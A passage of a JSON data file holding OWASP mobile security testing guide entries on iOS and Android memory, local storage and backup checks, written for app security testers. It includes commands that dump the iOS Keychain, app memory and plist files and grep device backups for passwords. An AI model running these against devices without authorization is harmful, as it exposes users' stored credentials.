Backups</a></em></li></ul>",
        "code": " MASTG-TEST-0216",
        "sort_order": 9
    },
    {
        "tags":
        [
            "MASTG-TEST-0060: Testing Memory for Sensitive Data"
        ],
        "testcase": "Testing Memory for Sensitive Data",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>When performing static analysis for sensitive data exposed via memory, you should</p><ul><li>try to identify application components and map where the data is used,</li><li>make sure that sensitive data is handled with as few components as possible,</li><li>make sure that object references are properly removed once the object containing sensitive data is no longer needed,</li><li>make sure that highly sensitive data is overwritten as soon as it is no longer needed,</li><li>not pass such data via immutable data types, such as String and NSString,</li><li>avoid non-primitive data types (because they might leave data behind),</li><li>overwrite the value in memory before removing references,</li><li>pay attention to third-party components (libraries and frameworks). Having a public API that handles data according to the recommendations above is a good indicator that developers considered the issues discussed here.</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>There are several approaches and tools available for dynamically testing the memory of an iOS app for sensitive data.</p><h3>Retrieving and Analyzing a Memory Dump</h3><p>Whether you are using a jailbroken or a non-jailbroken device, you can dump the app's process memory with <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> and <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0106\" rel=\"noopener noreferrer\" target=\"_blank\"> Fridump</a></em>. You can find a detailed explanation of this process in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0044\" rel=\"noopener noreferrer\" target=\"_blank\"> Process Exploration</a></em>.</p><p>After the memory has been dumped (e.g. to a file called \"memory\"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command strings or rabin2 -zz from <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0129\" rel=\"noopener noreferrer\" target=\"_blank\"> rabin2</a></em> to extract those strings.</p><pre># using strings\n$ strings memory &gt; strings.txt\n\n# using rabin2\n$ rabin2 -ZZ memory &gt; strings.txt\n</pre><p>Open strings.txt in your favorite editor and dig through it to identify sensitive information.</p><p>However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (/?) for more information and a list of options. The following shows only a subset of them:</p><pre>$ r2 &lt;name_of_your_dump_file&gt;\n\n[0x00000000]&gt; /?\nUsage: /[!bf] [arg]  Search stuff (see 'e??search' for options)\n|Use io.va for searching in non virtual addressing spaces\n| / foo\\x00                    search for string 'foo\\0'\n| /c[ar]                       search for crypto materials\n| /e /E.F/i                    match regular expression\n| /i foo                       search for string 'foo' ignoring case\n| /m[?][ebm] magicfile         search for magic, filesystems or binary headers\n| /v[1248] value               look for an `cfg.bigendian` 32bit value\n| /w foo                       search for wide string 'f\\0o\\0o\\0'\n| /x ff0033                    search for hex string\n| /z min max                   search for strings of given size\n...\n</pre><h3>Runtime Memory Analysis</h3><p>Perform <em><a href=\"https://mas.owasp.org/MASTG-TECH-0096\" rel=\"noopener noreferrer\" target=\"_blank\"> Process Exploration</a></em>, e.g., using <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0036\" rel=\"noopener noreferrer\" target=\"_blank\"> r2frida</a></em>, to analyze and inspect the app's memory while running and without needing to dump it.</p><p>For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash : after starting the session with r2 frida://usb//&lt;name_of_your_app&gt;.</p>",
        "code": "MASTG-TEST-0060",
        "sort_order": 16
    },
    {
        "tags":
        [
            "MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data"
        ],
        "testcase": "References to Backup Configurations Not Excluding Sensitive Data",
        "details": "<h2>Overview</h2><p>This test verifies whether apps correctly instruct the system to exclude sensitive files from backups by analyzing the app's AndroidManifest.xml and backup rule configuration files.</p><p><a href=\"https://mas.owasp.org/MASTG/0x05d-Testing-Data-Storage/#backups\" rel=\"noopener noreferrer\" target=\"_blank\">\"Android Backups\"</a> can be implemented via <a href=\"https://developer.android.com/identity/data/autobackup\" rel=\"noopener noreferrer\" target=\"_blank\">Auto Backup ↗</a> (Android 6.0 (API level 23) and higher) and <a href=\"https://developer.android.com/identity/data/keyvaluebackup\" rel=\"noopener noreferrer\" target=\"_blank\">Key-value backup ↗</a> (Android 2.2 (API level 8) and higher). Auto Backup is the recommended approach by Android as it is enabled by default and requires no work to implement.</p><p>To exclude specific files when using Auto Backup, developers must explicitly define exclusion rules in the exclude tag in:</p><ul><li>data_extraction_rules.xml (for Android 12 and higher using android:dataExtractionRules)</li><li>backup_rules.xml (for Android 11 or lower using android:fullBackupContent)</li></ul><p>The cloud-backup and device-transfer parameters can be used to exclude files from cloud backups and device-to-device transfers, respectively.</p><p>The key-value backup approach requires developers to set up a <a href=\"https://developer.android.com/identity/data/keyvaluebackup#BackupAgent\" rel=\"noopener noreferrer\" target=\"_blank\">BackupAgent ↗</a> or <a href=\"https://developer.android.com/identity/data/keyvaluebackup#BackupAgentHelper\" rel=\"noopener noreferrer\" target=\"_blank\">BackupAgentHelper ↗</a> and specify what data should be backed up.</p><p>Regardless of which approach the app used, Android provides a way to start the backup daemon to back up and restore app files. You can use this daemon for testing purposes and initiate the backup process and restore the app's data, allowing you to verify which files were restored from the backup.</p><h2></h2><h2>Steps</h2><ol><li>Obtain the AndroidManifest.xml file using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>.</li><li>Search for the allowBackup flag in the AndroidManifest.xml.</li><li>Search for the fullBackupContent attribute (for Android 11 or lower) or the dataExtractionRules attribute (for Android 12 and higher) in the AndroidManifest.xml.</li><li>Retrieve the backup_rules.xml or data_extraction_rules.xml file.</li></ol><h2></h2><h2>Observation</h2><p>The output should explicitly show:</p><ul><li>whether the allowBackup flag is set to true or false. If the flag is not specified, it is treated as true by default.</li><li>whether the fullBackupContent and/or dataExtractionRules attributes are present in the AndroidManifest.xml.</li><li>the contents of the backup_rules.xml or data_extraction_rules.xml file, if present.</li></ul><h2></h2><h2>Evaluation</h2><p>The test fails if the app allows sensitive data to be backed up. Specifically, if the following conditions are met:</p><ul><li>android:allowBackup=\"true\" in the AndroidManifest.xml</li><li>android:fullBackupContent=\"@xml/backup_rules\" isn't declared in the AndroidManifest.xml (for Android 11 or lower)</li><li>android:dataExtractionRules=\"@xml/data_extraction_rules\" isn't declared in the AndroidManifest.xml (for Android 12 and higher)</li><li>backup_rules.xml or data_extraction_rules.xml aren't present or don't exclude all sensitive files.</li></ul><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> Exclude Sensitive Data from Backups</a></em></li></ul>",
        "code": "MASTG-TEST-0262",
        "sort_order": 11
    },
    {
        "tags":
        [
            "MASTG-TEST-0052: Testing Local Data Storage"
        ],
        "testcase": "Testing Local Data Storage",
        "details": "<h2>Overview</h2><p>This test case focuses on identifying potentially sensitive data stored by an application and verifying if it is securely stored. The following checks should be performed:</p><ul><li>Analyze data storage in the source code.</li><li>Be sure to trigger all possible functionality in the application (e.g. by clicking everywhere possible) in order to ensure data generation.</li><li>Check all application generated and modified files and ensure that the storage method is sufficiently secure.<ul><li>This includes NSUserDefaults, databases, KeyChain, Internal Storage, External Storage, etc.</li></ul></li></ul><p><strong>NOTE:</strong> For MASVS L1 compliance, it is sufficient to store data unencrypted in the application's internal storage directory (sandbox). For L2 compliance, additional encryption is required using cryptographic keys securely managed in the iOS KeyChain. This includes using envelope encryption (DEK+KEK) or equivalent methods.</p><h2></h2><h2>Static Analysis</h2><p>When you have access to the source code of an iOS app, identify sensitive data that's saved and processed throughout the app. This includes passwords, secret keys, and personally identifiable information (PII), but it may as well include other data identified as sensitive by industry regulations, laws, and company policies. Look for this data being saved via any of the local storage APIs listed below.</p><p>Make sure that sensitive data is never stored without appropriate protection. For example, authentication tokens should not be saved in NSUserDefaults without additional encryption. Also avoid storing encryption keys in .plist files, hardcoded as strings in code, or generated using a predictable obfuscation function or key derivation function based on stable attributes.</p><p>Sensitive data should be stored by using the Keychain API (that stores them inside the Secure Enclave), or stored encrypted using envelope encryption. Envelope encryption, or key wrapping, is a cryptographic construct that uses symmetric encryption to encapsulate key material. Data encryption keys (DEK) can be encrypted with key encryption keys (KEK) which must be securely stored in the Keychain. Encrypted DEK can be stored in NSUserDefaults or written in files. When required, application reads KEK, then decrypts DEK. Refer to <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#encrypting-stored-keys\" rel=\"noopener noreferrer\" target=\"_blank\">OWASP Cryptographic Storage Cheat Sheet ↗</a> to learn more about encrypting cryptographic keys.</p><h3>Keychain</h3><p>The encryption must be implemented so that the secret key is stored in the Keychain with secure settings, ideally kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly. This ensures the usage of hardware-backed storage mechanisms. Make sure that the AccessControlFlags are set according to the security policy of the keys in the KeyChain.</p><p><a href=\"https://developer.apple.com/library/content/samplecode/GenericKeychain/Introduction/Intro.html#//apple_ref/doc/uid/DTS40007797-Intro-DontLinkElementID_2\" rel=\"noopener noreferrer\" target=\"_blank\">Generic examples of using the KeyChain ↗</a> to store, update, and delete data can be found in the official Apple documentation. The official Apple documentation also includes an example of using <a href=\"https://developer.apple.com/documentation/localauthentication/accessing_keychain_items_with_face_id_or_touch_id\" rel=\"noopener noreferrer\" target=\"_blank\">Touch ID and passcode protected keys ↗</a>.</p><h3>Filesystem</h3><p>Using the source code, examine the different APIs used to store data locally. Make sure that any data is properly encrypted based on its sensitivity.</p><h2></h2><h2>Dynamic Analysis</h2><p>One way to determine whether sensitive information (like credentials and keys) is stored insecurely without leveraging native iOS functions is to analyze the app's data directory. Triggering all app functionality before the data is analyzed is important because the app may store sensitive data only after specific functionality has been triggered. You can then perform static analysis for the data dump according to generic keywords and app-specific data.</p><p>The following steps can be used to determine how the application stores data locally on a jailbroken iOS device:</p><ol><li>Trigger the functionality that stores potentially sensitive data.</li><li>Connect to the iOS device and navigate to its Bundle directory (this applies to iOS versions 8.0 and above): /var/mobile/Containers/Data/Application/$APP_ID/</li><li>Execute grep with the data that you've stored, for example: grep -iRn \"USERID\".</li><li>If the sensitive data is stored in plaintext, the app fails this test.</li></ol><p>You can analyze the app's data directory on a non-jailbroken iOS device by using third-party applications, such as <a href=\"https://imazing.com/\" rel=\"noopener noreferrer\" target=\"_blank\">iMazing ↗</a>.</p><ol><li>Trigger the functionality that stores potentially sensitive data.</li><li>Connect the iOS device to your host computer and launch iMazing.</li><li>Select \"Apps\", right-click the desired iOS application, and select \"Extract App\".</li><li>Navigate to the output directory and locate $APP_NAME.imazing. Rename it to $APP_NAME.zip.</li><li>Unpack the ZIP file. You can then analyze the application data.</li></ol><p>Note that tools like iMazing don't copy data directly from the device. They try to extract data from the backups they create. Therefore, getting all the app data that's stored on the iOS device is impossible: not all folders are included in backups. Use a jailbroken device or repackage the app with Frida and use a tool like objection to access all the data and files.</p><p>If you added the Frida library to the app and repackaged it as described in \"Dynamic Analysis on Non-Jailbroken Devices\" (from the \"Tampering and Reverse Engineering on iOS\" chapter), you can use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> to transfer files directly from the app's data directory or <a href=\"https://github.com/sensepost/objection/wiki/Using-objection#getting-started-ios-edition\" rel=\"noopener noreferrer\" target=\"_blank\">read files in objection ↗</a> as explained in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0053\" rel=\"noopener noreferrer\" target=\"_blank\"> Host-Device Data Transfer</a></em>.</p><p>The Keychain contents can be dumped during dynamic analysis using different tools, see <em><a href=\"https://mas.owasp.org/MASTG-TECH-0061\" rel=\"noopener noreferrer\" target=\"_blank\"> Dumping KeyChain Data</a></em>.</p><p>The path to the Keychain file is</p><pre>/private/var/Keychains/keychain-2.db\n</pre><p>On a non-jailbroken device, you can use objection to <a href=\"https://github.com/sensepost/objection/wiki/Notes-About-The-Keychain-Dumper\" rel=\"noopener noreferrer\" target=\"_blank\">dump the Keychain items ↗</a> created and stored by the app.</p><h3>Dynamic Analysis with Xcode and iOS simulator</h3><p>This test is only available on macOS, as Xcode and the iOS simulator is needed.</p><p>For testing the local storage and verifying what data is stored within it, it's not mandatory to have an iOS device. With access to the source code and Xcode the app can be build and deployed in the iOS simulator. The file system of the current device of the iOS simulator is available in ~/Library/Developer/CoreSimulator/Devices.</p><p>Once the app is running in the iOS simulator, you can navigate to the directory of the latest simulator started with the following command:</p><pre>$ cd ~/Library/Developer/CoreSimulator/Devices/$(\nls -alht ~/Library/Developer/CoreSimulator/Devices | head -n 2 |\nawk '{print $9}' | sed -n '1!p')/data/Containers/Data/Application\n</pre><p>The command above will automatically find the UUID of the latest simulator started. Now you still need to grep for your app name or a keyword in your app. This will show you the UUID of the app.</p><pre>grep -iRn keyword .\n</pre><p>Then you can monitor and verify the changes in the filesystem of the app and investigate if any sensitive information is stored within the files while using the app.</p><h3>Dynamic Analysis with Objection</h3><p>You can use the <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0038\" rel=\"noopener noreferrer\" target=\"_blank\"> objection</a></em> runtime mobile exploration toolkit to find vulnerabilities caused by the application's data storage mechanism. Objection can be used without a Jailbroken device, but it will require <a href=\"https://github.com/sensepost/objection/wiki/Patching-iOS-Applications\" rel=\"noopener noreferrer\" target=\"_blank\">patching the iOS Application ↗</a>.</p><p>Reading the Keychain</p><p>To use Objection to read the Keychain, execute the following command:</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios keychain dump\nNote: You may be asked to authenticate using the devices passcode or TouchID\nSave the output by adding `--json keychain.json` to this command\nDumping the iOS keychain...\nCreated                    Accessible                      ACL    Type      Account                    Service                                                        Data\n-------------------------  ------------------------------  -----  --------  -------------------------  -------------------------------------------------------------  ------------------------------------\n2020-02-11 13:26:52 +0000  WhenUnlocked                    None   Password  keychainValue              com.highaltitudehacks.DVIAswiftv2.develop                      mysecretpass123\n</pre><p>Searching for Binary Cookies</p><p>iOS applications often store binary cookie files in the application sandbox. Cookies are binary files containing cookie data for application WebViews. You can use objection to convert these files to a JSON format and inspect the data.</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json\n[\n    {\n        \"domain\": \"highaltitudehacks.com\",\n        \"expiresDate\": \"2051-09-15 07:46:43 +0000\",\n        \"isHTTPOnly\": \"false\",\n        \"isSecure\": \"false\",\n        \"name\": \"username\",\n        \"path\": \"/\",\n        \"value\": \"admin123\",\n        \"version\": \"0\"\n    }\n]\n</pre><p>Searching for Property List Files</p><p>iOS applications often store data in property list (plist) files that are stored in both the application sandbox and the IPA package. Sometimes these files contain sensitive information, such as usernames and passwords; therefore, the contents of these files should be inspected during iOS assessments. Use the ios plist cat plistFileName.plist command to inspect the plist file.</p><p>To find the file userInfo.plist, use the env command. It will print out the locations of the applications Library, Caches and Documents directories:</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # env\nName               Path\n-----------------  -------------------------------------------------------------------------------------------\nBundlePath         /private/var/containers/Bundle/Application/B2C8E457-1F0C-4DB1-8C39-04ACBFFEE7C8/DVIA-v2.app\nCachesDirectory    /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Caches\nDocumentDirectory  /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Documents\nLibraryDirectory   /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library\n</pre><p>Go to the Documents directory and list all files using ls.</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ls\nNSFileType      Perms  NSFileProtection                      Read    Write    Owner         Group         Size      Creation                   Name\n------------  -------  ------------------------------------  ------  -------  ------------  ------------  --------  -------------------------  ------------------------\nDirectory         493  n/a                                   True    True     mobile (501)  mobile (501)  192.0 B   2020-02-12 07:03:51 +0000  default.realm.management\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  16.0 KiB  2020-02-12 07:03:51 +0000  default.realm\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  1.2 KiB   2020-02-12 07:03:51 +0000  default.realm.lock\nRegular           420  CompleteUntilFirstUserAuthentication  True    True     mobile (501)  mobile (501)  284.0 B   2020-05-29 18:15:23 +0000  userInfo.plist\nUnknown           384  n/a                                   True    True     mobile (501)  mobile (501)  0.0 B     2020-02-12 07:03:51 +0000  default.realm.note\n\nReadable: True  Writable: True\n</pre><p>Execute the ios plist cat command to inspect the content of userInfo.plist file.</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios plist cat userInfo.plist\n{\n        password = password123;\n        username = userName;\n}\n</pre><p>Searching for SQLite Databases</p><p>iOS applications typically use SQLite databases to store data required by the application. Testers should check the data protection values of these files and their contents for sensitive data. Objection contains a module to interact with SQLite databases. It allows to dump the schema, their tables and query the records.</p><pre>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # sqlite connect Model.sqlite\nCaching local copy of database file...\nDownloading /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Application Support/Model.sqlite to /var/folders/4m/dsg0mq_17g39g473z0996r7m0000gq/T/tmpdr_7rvxi.sqlite\nStreaming file from device...\nWriting bytes to destination...\nSuccessfully downloaded /var/mobile/Containers/Data/Application/264C23B8-07B5-4B5D-8701-C020C301C151/Library/Application Support/Model.sqlite to /var/folders/4m/dsg0mq_17g39g473z0996r7m0000gq/T/tmpdr_7rvxi.sqlite\nValidating SQLite database format\nConnected to SQLite database at: Model.sqlite\n\nSQLite @ Model.sqlite &gt; .tables\n+--------------+\n| name         |\n+--------------+\n| ZUSER        |\n| Z_METADATA   |\n| Z_MODELCACHE |\n| Z_PRIMARYKEY |\n+--------------+\nTime: 0.013s\n\nSQLite @ Model.sqlite &gt; select * from Z_PRIMARYKEY\n+-------+--------+---------+-------+\n| Z_ENT | Z_NAME | Z_SUPER | Z_MAX |\n+-------+--------+---------+-------+\n| 1     | User   | 0       | 0     |\n+-------+--------+---------+-------+\n1 row in set\nTime: 0.013s\n</pre><p>Searching for Cache Databases</p><p>By default NSURLSession stores data, such as HTTP requests and responses in the Cache.db database. This database can contain sensitive data, if tokens, usernames or any other sensitive information has been cached. To find the cached information open the data directory of the app (/var/mobile/Containers/Data/Application/&lt;UUID&gt;) and go to /Library/Caches/&lt;Bundle Identifier&gt;. The WebKit cache is also being stored in the Cache.db file. Objection can open and interact with the database with the command sqlite connect Cache.db, as it is a normal SQLite database.</p><p>It is recommended to disable Caching this data, as it may contain sensitive information in the request or response. The following list below shows different ways of achieving this:</p><ol><li>It is recommended to remove Cached responses after logout. This can be done with the provided method by Apple called <a href=\"https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses\" rel=\"noopener noreferrer\" target=\"_blank\">removeAllCachedResponses ↗</a> You can call this method as follows:</li></ol><p>URLCache.shared.removeAllCachedResponses()</p><p>This method will remove all cached requests and responses from Cache.db file.</p><ol><li>If you don't need to use the advantage of cookies it would be recommended to just use the <a href=\"https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral\" rel=\"noopener noreferrer\" target=\"_blank\">.ephemeral ↗</a> configuration property of URLSession, which will disable saving cookies and Caches.</li></ol><p><a href=\"https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral\" rel=\"noopener noreferrer\" target=\"_blank\">Apple documentation ↗</a>:</p><p>An ephemeral session configuration object is similar to a default session configuration (see default), except that the corresponding session object doesn’t store caches, credential stores, or any session-related data to disk. Instead, session-related data is stored in RAM. The only time an ephemeral session writes data to disk is when you tell it to write the contents of a URL to a file.</p><ol><li>Cache can be also disabled by setting the Cache Policy to <a href=\"https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed\" rel=\"noopener noreferrer\" target=\"_blank\">.notAllowed ↗</a>. It will disable storing Cache in any fashion, either in memory or on disk.</li></ol>",
        "code": "MASTG-TEST-0052",
        "sort_order": 12
    },
    {
        "tags":
        [
            "MASTG-TEST-0215: Sensitive Data Not Excluded From Backup"
        ],
        "testcase": "Sensitive Data Not Excluded From Backup",
        "details": "<h2>Overview</h2><p>This test verifies whether your app correctly instructs the system to exclude sensitive files from backups.</p><p>Files in the /tmp and /Library/Caches subdirectories of the app container are excluded from iCloud Backups. For files and directories in any other locations within the app container, iOS provides the <a href=\"https://developer.apple.com/documentation/foundation/urlresourcevalues/1780002-isexcludedfrombackup\" rel=\"noopener noreferrer\" target=\"_blank\">isExcludedFromBackup ↗</a> API to guide the system not to back up a given file or directory. However, this API <a href=\"https://developer.apple.com/documentation/foundation/optimizing_your_app_s_data_for_icloud_backup/#3928527\" rel=\"noopener noreferrer\" target=\"_blank\">does not guarantee guarantee the actual exclusion ↗</a>:</p><p>\"The isExcludedFromBackup resource value exists only to provide guidance to the system about which files and directories it can exclude; it's not a mechanism to guarantee those items never appear in a backup or on a restored device.\"</p><p>Therefore, the only way to properly protect your files from a backup is to encrypt them.</p><h2></h2><h2>Steps</h2><ol><li>Run a static analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0073\" rel=\"noopener noreferrer\" target=\"_blank\"> radare2 for iOS</a></em> on the app binary, or use a dynamic analysis tool like <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0039\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida for iOS</a></em>, and look for uses of isExcludedFromBackup API.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the disassembled code of the functions using isExcludedFromBackup and if possible the list of affected files.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find the use of isExcludedFromBackup within the source code and if any of the affected files can be considered sensitive.</p><p>For the sensitive files found, and in addition to using isExcludedFromBackup, make sure to encrypt them, as isExcludedFromBackup does not guarantee the exclusion.</p>",
        "code": "MASTG-TEST-0215",
        "sort_order": 17
    },
    {
        "tags":
        [
            "MASTG-TEST-0058: Testing Backups for Sensitive Data"
        ],
        "testcase": "Testing Backups for Sensitive Data",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>A backup of a device on which a mobile application has been installed will include all subdirectories (except for Library/Caches/) and files in the <a href=\"https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW12\" rel=\"noopener noreferrer\" target=\"_blank\">app's private directory ↗</a>.</p><p>Therefore, avoid storing sensitive data in plaintext within any of the files or folders that are in the app's private directory or subdirectories.</p><p>Although all the files in Documents/ and Library/Application Support/ are always backed up by default, you can <a href=\"https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28\" rel=\"noopener noreferrer\" target=\"_blank\">exclude files from the backup ↗</a> by calling NSURL setResourceValue:forKey:error: with the NSURLIsExcludedFromBackupKey key.</p><p>You can use the <a href=\"https://developer.apple.com/reference/foundation/nsurl#//apple_ref/c/data/NSURLIsExcludedFromBackupKey\" rel=\"noopener noreferrer\" target=\"_blank\">NSURLIsExcludedFromBackupKey ↗</a> and <a href=\"https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple_ref/c/data/kCFURLIsExcludedFromBackupKey\" rel=\"noopener noreferrer\" target=\"_blank\">CFURLIsExcludedFromBackupKey ↗</a> file system properties to exclude files and directories from backups. An app that needs to exclude many files can do so by creating its own subdirectory and marking that directory excluded. Apps should create their own directories for exclusion instead of excluding system-defined directories.</p><p>Both file system properties are preferable to the deprecated approach of directly setting an extended attribute. All apps running on iOS version 5.1 and later should use these properties to exclude data from backups.</p><p>The following is <a href=\"https://developer.apple.com/library/content/qa/qa1719/index.html\" rel=\"noopener noreferrer\" target=\"_blank\">sample Objective-C code for excluding a file from a backup ↗</a> on iOS 5.1 and later:</p><pre>- (BOOL)addSkipBackupAttributeToItemAtPath:(NSString *) filePathString\n{\n    NSURL* URL= [NSURL fileURLWithPath: filePathString];\n    assert([[NSFileManager defaultManager] fileExistsAtPath: [URL path]]);\n\n    NSError *error = nil;\n    BOOL success = [URL setResourceValue: [NSNumber numberWithBool: YES]\n                                  forKey: NSURLIsExcludedFromBackupKey error: &amp;error];\n    if(!success){\n        NSLog(@\"Error excluding %@ from backup %@\", [URL lastPathComponent], error);\n    }\n    return success;\n}\n</pre><p>The following is sample Swift code for excluding a file from a backup on iOS 5.1 and later, see <a href=\"https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/\" rel=\"noopener noreferrer\" target=\"_blank\">Swift excluding files from iCloud backup ↗</a> for more information:</p><pre>enum ExcludeFileError: Error {\n    case fileDoesNotExist\n    case error(String)\n}\n\nfunc excludeFileFromBackup(filePath: URL) -&gt; Result&lt;Bool, ExcludeFileError&gt; {\n    var file = filePath\n\n    do {\n        if FileManager.default.fileExists(atPath: file.path) {\n            var res = URLResourceValues()\n            res.isExcludedFromBackup = true\n            try file.setResourceValues(res)\n            return .success(true)\n\n        } else {\n            return .failure(.fileDoesNotExist)\n        }\n    } catch {\n        return .failure(.error(\"Error excluding \\(file.lastPathComponent) from backup \\(error)\"))\n    }\n}\n</pre><h2></h2><h2>Dynamic Analysis</h2><p>In order to test the backup, you obviously need to create one first. The most common way to create a backup of an iOS device is by using iTunes, which is available for Windows, Linux and of course macOS (till macOS Mojave). When creating a backup via iTunes you can always only backup the whole device and not select just a single app. Make sure that the option \"Encrypt local backup\" in iTunes is not set, so that the backup is stored in cleartext on your hard drive.</p><p>iTunes is not available anymore from macOS Catalina onwards. Managing of an iOS device, including updates, backup and restore has been moved to the Finder app. The approach remains the same, as described above.</p><p>After the iOS device has been backed up, you need to retrieve the file path of the backup, which are different locations on each OS. The official Apple documentation will help you to <a href=\"https://support.apple.com/en-us/HT204215\" rel=\"noopener noreferrer\" target=\"_blank\">locate backups of your iPhone, iPad, and iPod touch ↗</a>.</p><p>When you want to navigate to the backup folder up to High Sierra you can easily do so. Starting with macOS Mojave you will get the following error (even as root):</p><pre>$ pwd\n/Users/foo/Library/Application Support\n$ ls -alh MobileSync\nls: MobileSync: Operation not permitted\n</pre><p>This is not a permission issue of the backup folder, but a new feature in macOS Mojave. You can solve this problem by granting full disk access to your terminal application by following the explanation on <a href=\"http://osxdaily.com/2018/10/09/fix-operation-not-permitted-terminal-error-macos/\" rel=\"noopener noreferrer\" target=\"_blank\">OSXDaily ↗</a>.</p><p>Before you can access the directory you need to select the folder with the UDID of your device. Check the section <a href=\"https://mas.owasp.org/MASTG/0x06b-iOS-Security-Testing/#obtaining-the-udid-of-an-ios-device\" rel=\"noopener noreferrer\" target=\"_blank\">\"Obtaining the UDID of an iOS device\"</a> on how to retrieve it.</p><p>Once you know the UDID you can navigate into this directory and you will find the full backup of the whole device, which does include pictures, app data and whatever might have been stored on the device.</p><p>Review the data that's in the backed up files and folders. The structure of the directories and file names is obfuscated and will look like this:</p><pre>$ pwd\n/Users/foo/Library/Application Support/MobileSync/Backup/416f01bd160932d2bf2f95f1f142bc29b1c62dcb/00\n$ ls | head -n 3\n000127b08898088a8a169b4f63b363a3adcf389b\n0001fe89d0d03708d414b36bc6f706f567b08d66\n000200a644d7d2c56eec5b89c1921dacbec83c3e\n</pre><p>Therefore, it's not straightforward to navigate through it and you will not find any hints of the app you want to analyze in the directory or file name. You can consider using the <a href=\"https://imazing.com/\" rel=\"noopener noreferrer\" target=\"_blank\">iMazing ↗</a> shareware utility to assist here. Perform a device backup with iMazing and use its built-in backup explorer to easily analyze app container contents including original paths and file names.</p><p>Without iMazing or similar software you may need to resort to using grep to identify sensitive data. This is not the most thorough approach but you can try searching for sensitive data that you have keyed in while using the app before you made the backup. For example: the username, password, credit card data, PII or any data that is considered sensitive in the context of the app.</p><pre>~/Library/Application Support/MobileSync/Backup/&lt;UDID&gt;\ngrep -iRn \"password\" .\n</pre><p>As described in the Static Analysis section, any sensitive data that you're able to find should be excluded from the backup, encrypted properly by using the Keychain or not stored on the device in the first place.</p><p>To identify if a backup is encrypted, you can check the key named \"IsEncrypted\" from the file \"Manifest.plist\", located at the root of the backup directory. The following example shows a configuration indicating that the backup is encrypted:</p><pre>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"&gt;\n&lt;plist version=\"1.0\"&gt;\n...\n &lt;key&gt;Date&lt;/key&gt;\n &lt;date&gt;2021-03-12T17:43:33Z&lt;/date&gt;\n &lt;key&gt;IsEncrypted&lt;/key&gt;\n &lt;true/&gt;\n...\n&lt;/plist&gt;\n</pre><p>In case you need to work with an encrypted backup, there are some Python scripts in <a href=\"https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts\" rel=\"noopener noreferrer\" target=\"_blank\">DinoSec's GitHub repo ↗</a>, such as backup_tool.py and backup_passwd.py, that will serve as a good starting point. However, note that they might not work with the latest iTunes/Finder versions and might need to be tweaked.</p><p>You can also use the tool <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0053\" rel=\"noopener noreferrer\" target=\"_blank\"> iOSbackup</a></em> to easily read and extract files from a password-encrypted iOS backup.</p><h3>Proof of Concept: Removing UI Lock with Tampered Backup</h3><p>As discussed earlier, sensitive data is not limited to just user data and PII. It can also be configuration or settings files that affect app behavior, restrict functionality, or enable security controls. If you take a look at the open source bitcoin 